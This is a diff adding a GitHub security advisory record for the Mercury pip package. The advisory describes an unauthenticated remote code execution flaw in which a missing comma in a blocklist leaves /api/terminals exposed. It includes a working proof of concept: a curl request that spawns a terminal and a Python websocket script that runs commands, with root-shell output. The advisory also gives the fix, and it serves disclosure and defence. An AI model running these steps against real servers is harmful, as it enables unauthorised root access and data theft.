@@ -1,0 +1,101 @@
+{
+  "ghsa_id": "GHSA-f8c7-rwf9-fmgm",
+  "cve_id": "CVE-2026-111057",
+  "url": "https://api.github.com/advisories/GHSA-f8c7-rwf9-fmgm",
+  "html_url": "https://github.com/advisories/GHSA-f8c7-rwf9-fmgm",
+  "summary": "Mercury: Unauthenticated Remote Code Execution in /api/terminals - access control bypass",
+  "description": "### Summary\nA missing comma in `mercury_app/block_handler.py`'s `BLOCKED_PATTERNS` list causes the blocklist to fail to cover the `/api/terminals` endpoint. As a result, any unauthenticated attacker can spawn a full, interactive OS-level shell on the host running Mercury.\n\n### Details\nThe blocklist in `mercury_app/block_handler.py` is defined as:\n```\nBLOCKED_PATTERNS = [\n    # JupyterLab UI + API\n    r\"/lab(?!/(?:extensions/|api/settings(?:/|$)|api/translations(?:/|$)))(?:/.*)?\"\n    r\"/api/terminals(?:/.*)?\",\n    r\"/api/shutdown(?:/.*)?\",\n    r\"/files(?:/.*)?\",\n]\n```\nThe missing comma between the first and the second line causes Python to merge the rules, therefore the actual list that is blocked looks like this:\n\n/lab...(?:/.`*`)?/api/terminals(?:/.`*`)? (the first two lines joined together)\n/api/shutdown(?:/.`*`)?\n/files(?:/.`*`)?\n\nA direct request to `/api/terminals` does not match any of the 3 blocklist rules and is therefore **not blocked**, reaching Jupyter\nServer's built-in terminal API, which spawns a real OS shell accessible over a WebSocket connection. No authentication, account, session or pre-existing access to Mercury is required.\n\n### PoC\nTesting was performed on a local Docker deployment (https://runmercury.com/deploy/dockerfile/), Mercury version 3.2.3, default\nconfiguration.\n \n**Step 1 - spawn a terminal:**\n\n\n```\ncurl -i -X POST http://localhost:8888/api/terminals\n```\nResponse: `{\"name\": \"1\", \"last_activity\": \"...\"}`\n\n**Step 2 - connect to the terminal and execute commands:**\n\n\n```\npython3 -c \"\nimport websocket, json, time\n\nws = websocket.create_connection('ws://localhost:8888/terminals/websocket/1')\nprint(ws.recv())\n\nws.send(json.dumps(['stdin', 'whoami && id\\n']))\ntime.sleep(1)\n\nws.settimeout(2)\ntry:\n    while True:\n        print(ws.recv())\nexcept Exception:\n    pass\n\"\n```\n\n\nObserved output:\n\n```\n[\"setup\", {}]\n[\"stdout\", \"# \"]\n[\"stdout\", \"whoami && id\\r\\n\"]\n[\"stdout\", \"root\\r\\n\"]\n[\"stdout\", \"uid=0(root) gid=0(root) groups=0(root)\\r\\n# \"]\n```\n\n\nConfirms full, interactive root shell access with no authentication or prior access of any kind.\n\n\n### Impact\n- **Confidentiality:** full read access to any file the Mercury process can access (notebooks, uploaded data, environment variables, secrets).\n- **Integrity:** attacker can modify or delete any file, including notebooks served to other users.\n- **Availability:** attacker can shut down or crash the server/container.\n- **Lateral movement:** the shell can be used as a foothold to attack other systems reachable from the host's network.\n\nExploitable by any network client that can reach the Mercury server, including the public internet if it is deployed without additional access controls (VPN, reverse-proxy authentication, firewall).\n\n### Fix\nAdd the missing comma so `/api/terminals` becomes an independent blocklist rule:\n```\nBLOCKED_PATTERNS = [\n    # JupyterLab UI + API\n    r\"/lab(?!/(?:extensions/|api/settings(?:/|$)|api/translations(?:/|$)))(?:/.*)?\",\n    r\"/api/terminals(?:/.*)?\",\n    r\"/api/shutdown(?:/.*)?\",\n    r\"/files(?:/.*)?\",\n]\n```",
+  "type": "reviewed",
+  "severity": "critical",
+  "repository_advisory_url": "https://api.github.com/repos/mljar/mercury/security-advisories/GHSA-f8c7-rwf9-fmgm",
+  "source_code_location": "https://github.com/mljar/mercury",
+  "identifiers": [
+    {
+      "value": "GHSA-f8c7-rwf9-fmgm",
+      "type": "GHSA"
+    },
+    {
+      "value": "CVE-2026-111057",
+      "type": "CVE"
+    }
+  ],
+  "references": [
+    "https://github.com/mljar/mercury/security/advisories/GHSA-f8c7-rwf9-fmgm",
+    "https://github.com/mljar/mercury/commit/8c467129037ee9df269d543ac217ffd33b97bf3f",
+    "https://github.com/mljar/mercury/releases/tag/v3.2.4",
+    "https://github.com/advisories/GHSA-f8c7-rwf9-fmgm"
+  ],
+  "published_at": "2026-10-19T17:00:54Z",
+  "updated_at": "2026-10-19T17:00:55Z",
+  "github_reviewed_at": "2026-10-19T17:00:54Z",
+  "nvd_published_at": null,
+  "withdrawn_at": null,
+  "vulnerabilities": [
+    {
+      "package": {
+        "ecosystem": "pip",
+        "name": "mercury"
+      },
+      "vulnerable_version_range": ">= 3.0.0, <= 3.2.3",
+      "first_patched_version": "3.2.4",
+      "vulnerable_functions": [
+
+      ]
+    }
+  ],
+  "cvss_severities": {
+    "cvss_v3": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+      "score": 10.0
+    },
+    "cvss_v4": {
+      "vector_string": null,
+      "score": 0.0
+    }
+  },
+  "cwes": [
+    {
+      "cwe_id": "CWE-185",
+      "name": "Incorrect Regular Expression"
+    },
+    {
+      "cwe_id": "CWE-284",
+      "name": "Improper Access Control"
+    }
+  ],
+  "credits": [
+    {
+      "user": {
+        "login": "szotgan",
+        "id": 102298702,
+        "node_id": "U_kgDOBhj0Tg",
+        "avatar_url": "https://avatars.githubusercontent.com/u/102298702?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/szotgan",
+        "html_url": "https://github.com/szotgan",
+        "followers_url": "https://api.github.com/users/szotgan/followers",
+        "following_url": "https://api.github.com/users/szotgan/following{/other_user}",
+        "gists_url": "https://api.github.com/users/szotgan/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/szotgan/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/szotgan/subscriptions",
+        "organizations_url": "https://api.github.com/users/szotgan/orgs",
+        "repos_url": "https://api.github.com/users/szotgan/repos",
+        "events_url": "https://api.github.com/users/szotgan/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/szotgan/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "type": "reporter"
+    }
+  ],
+  "comments": 1,
+  "cvss": {
+    "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+    "score": 10.0
+  },
+  "epss": {
+    "percentage": 0.00443,
+    "percentile": 0.37177
+  }
+}
